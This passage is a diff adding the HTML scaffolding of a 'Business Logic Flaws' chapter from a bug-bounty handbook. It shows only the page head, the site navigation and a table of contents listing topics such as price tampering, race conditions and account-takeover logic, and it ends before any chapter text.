@@ -1,0 +1,2226 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Business logic flaws are invisible to scanners. They require knowing what the application is supposed to do and testing whether it actually does it. No CVE, no payload, no tool — just intent and observation.">
+      
+      
+        <meta name="author" content="Wellington Vumu">
+      
+      
+      
+        <link rel="prev" href="../part-05-ssrf-xxe/">
+      
+      
+        <link rel="next" href="../part-07-api/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.39">
+    
+    
+      
+        <title>Business Logic Flaws - Hunter's handbook</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../assets/stylesheets/modern/main.1e981d71.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../assets/stylesheets/modern/palette.dfe2e883.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,500,500i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,a=__md_scope)=>JSON.parse(t.getItem(a.pathname+"."+e)),__md_set=(e,t,a=localStorage,_=__md_scope)=>{try{a.setItem(_.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#business-logic-flaws" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="./.." title="Hunter&#x27;s handbook" class="md-header__button md-logo" aria-label="Hunter's handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hunter's handbook
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Business Logic Flaws
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-sun" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-moon" viewBox="0 0 24 24"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+    </div>
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="./.." title="Hunter&#x27;s handbook" class="md-nav__button md-logo" aria-label="Hunter's handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    Hunter's handbook
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="./.." class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-rocket" viewBox="0 0 24 24"><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09"/><path d="M9 12a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.4 22.4 0 0 1-4 2z"/><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 .05 5 .05"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-01-recon/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-02-authentication/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-round-key" viewBox="0 0 24 24"><path d="M19 11v6M19 13h2M2 21a8 8 0 0 1 12.868-6.349"/><circle cx="10" cy="8" r="5"/><circle cx="19" cy="19" r="2"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-03-access-control/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user-lock" viewBox="0 0 24 24"><path d="M19 16v-2a2 2 0 0 0-4 0v2M9.5 15H7a4 4 0 0 0-4 4v2"/><circle cx="10" cy="7" r="4"/><rect width="8" height="5" x="13" y="16" rx=".899"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-04-injection/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-syringe" viewBox="0 0 24 24"><path d="m18 2 4 4M17 7l3-3M19 9 8.7 19.3c-1 1-2.5 1-3.4 0l-.6-.6c-1-1-1-2.5 0-3.4L15 5M9 11l4 4M5 19l-3 3M14 4l6 6"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-05-ssrf-xxe/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-server" viewBox="0 0 24 24"><rect width="20" height="8" x="2" y="2" rx="2" ry="2"/><rect width="20" height="8" x="2" y="14" rx="2" ry="2"/><path d="M6 6h.01M6 18h.01"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF & XXE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brain" viewBox="0 0 24 24"><path d="M12 18V5M15 13a4.17 4.17 0 0 1-3-4 4.17 4.17 0 0 1-3 4M17.598 6.5A3 3 0 1 0 12 5a3 3 0 1 0-5.598 1.5"/><path d="M17.997 5.125a4 4 0 0 1 2.526 5.77"/><path d="M18 18a4 4 0 0 0 2-7.464"/><path d="M19.967 17.483A4 4 0 1 1 12 18a4 4 0 1 1-7.967-.517"/><path d="M6 18a4 4 0 0 1-2-7.464"/><path d="M6.003 5.125a4 4 0 0 0-2.526 5.77"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="././" class="md-nav__link md-nav__link--active">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brain" viewBox="0 0 24 24"><path d="M12 18V5M15 13a4.17 4.17 0 0 1-3-4 4.17 4.17 0 0 1-3 4M17.598 6.5A3 3 0 1 0 12 5a3 3 0 1 0-5.598 1.5"/><path d="M17.997 5.125a4 4 0 0 1 2.526 5.77"/><path d="M18 18a4 4 0 0 0 2-7.464"/><path d="M19.967 17.483A4 4 0 1 1 12 18a4 4 0 1 1-7.967-.517"/><path d="M6 18a4 4 0 0 1-2-7.464"/><path d="M6.003 5.125a4 4 0 0 0-2.526 5.77"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#the-mental-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        The Mental Model
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#decision-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Decision Flow
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#62-price--payment-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.2 Price &amp; Payment Manipulation
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6.2 Price &amp; Payment Manipulation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#621-negative-quantity-and-price-tampering" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.2.1 Negative Quantity and Price Tampering
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#622-currency-confusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.2.2 Currency Confusion
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#623-coupon-and-discount-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.2.3 Coupon and Discount Abuse
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#624-free-trial-and-subscription-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.2.4 Free Trial and Subscription Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#63-workflow-and-state-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.3 Workflow and State Bypass
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6.3 Workflow and State Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#631-multi-step-process-skip" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.3.1 Multi-Step Process Skip
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#632-status-parameter-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.3.2 Status Parameter Manipulation
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#64-race-conditions" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.4 Race Conditions
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6.4 Race Conditions">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#641-high-value-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.4.1 High-Value Targets
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#642-single-packet-attack-http2" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.4.2 Single-Packet Attack (HTTP/2)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#643-turbo-intruder-http11" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.4.3 Turbo Intruder (HTTP/1.1)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#644-poc-and-reporting" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.4.4 PoC and Reporting
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#65-account-and-ownership-logic" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.5 Account and Ownership Logic
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6.5 Account and Ownership Logic">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#651-logic-based-account-takeover" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.5.1 Logic-Based Account Takeover
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#652-email-confirmation-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.5.2 Email Confirmation Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#653-organization-and-invitation-logic" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.5.3 Organization and Invitation Logic
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#66-feature-abuse-with-security-impact" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.6 Feature Abuse with Security Impact
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6.6 Feature Abuse with Security Impact">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#661-file-operation-logic" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.6.1 File Operation Logic
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#662-importexport-data-exposure" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.6.2 Import/Export Data Exposure
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#663-notification-and-webhook-logic" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.6.3 Notification and Webhook Logic
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-6-complete-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Part 6 Complete Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        References
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-07-api/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-cog" viewBox="0 0 24 24"><path d="M11 10.27 7 3.34M11 13.73l-4 6.93M12 22v-2M12 2v2M14 12h8M17 20.66l-1-1.73M17 3.34l-1 1.73M2 12h2M20.66 17l-1.73-1M20.66 7l-1.73 1M3.34 17l1.73-1M3.34 7l1.73 1"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="12" r="8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    API Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-08-ai-llm/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-brain-circuit" viewBox="0 0 24 24"><path d="M12 5a3 3 0 1 0-5.997.125 4 4 0 0 0-2.526 5.77 4 4 0 0 0 .556 6.588A4 4 0 1 0 12 18Z"/><path d="M9 13a4.5 4.5 0 0 0 3-4M6.003 5.125A3 3 0 0 0 6.401 6.5M3.477 10.896a4 4 0 0 1 .585-.396M6 18a4 4 0 0 1-1.967-.516M12 13h4M12 18h6a2 2 0 0 1 2 2v1M12 8h8M16 8V5a2 2 0 0 1 2-2"/><circle cx="16" cy="13" r=".5"/><circle cx="18" cy="3" r=".5"/><circle cx="20" cy="21" r=".5"/><circle cx="20" cy="8" r=".5"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    AI & LLM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-09-cloud/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-cloud" viewBox="0 0 24 24"><path d="M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-10-mobile/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-smartphone" viewBox="0 0 24 24"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Mobile
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-11-reporting/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-notebook-pen" viewBox="0 0 24 24"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4M2 6h4M2 10h4M2 14h4M2 18h4"/><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Reporting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-12-platform/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-layers" viewBox="0 0 24 24"><path d="M12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83z"/><path d="M2 12a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 12"/><path d="M2 17a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 17"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Platform
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-13-tooling/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-wrench" viewBox="0 0 24 24"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.106-3.105c.32-.322.863-.22.983.218a6 6 0 0 1-8.259 7.057l-7.91 7.91a1 1 0 0 1-2.999-3l7.91-7.91a6 6 0 0 1 7.057-8.259c.438.12.54.662.219.984z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Tooling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../part-14-infrastructure/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-server-cog" viewBox="0 0 24 24"><path d="m10.852 14.772-.383.923M13.148 14.772a3 3 0 1 0-2.296-5.544l-.383-.923M13.148 9.228l.383-.923"/><path d="m13.53 15.696-.382-.924a3 3 0 1 1-2.296-5.544M14.772 10.852l.923-.383M14.772 13.148l.923.383"/><path d="M4.5 10H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2h-.5M4.5 14H4a2 2 0 0 0-2 2v4a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-4a2 2 0 0 0-2-2h-.5M6 18h.01M6 6h.01M9.228 10.852l-.923-.383M9.228 13.148l-.923.383"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../appendices/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-file-text" viewBox="0 0 24 24"><path d="M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z"/><path d="M14 2v5a1 1 0 0 0 1 1h5M10 9H8M16 13H8M16 17H8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Appendices
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  
+                    
+                    
+                    
+                      
+                    
+                    
+                      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+                      <div class="md-sidebar-button__wrapper">
+                        <label class="md-sidebar-button" for="__toc"></label>
+                      </div>
+                    
+                  
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#the-mental-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        The Mental Model
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#decision-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Decision Flow
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#62-price--payment-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        6.2 Price &amp; Payment Manipulation
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6.2 Price &amp; Payment Manipulation">
+      <ul class="md-nav__list">
+        
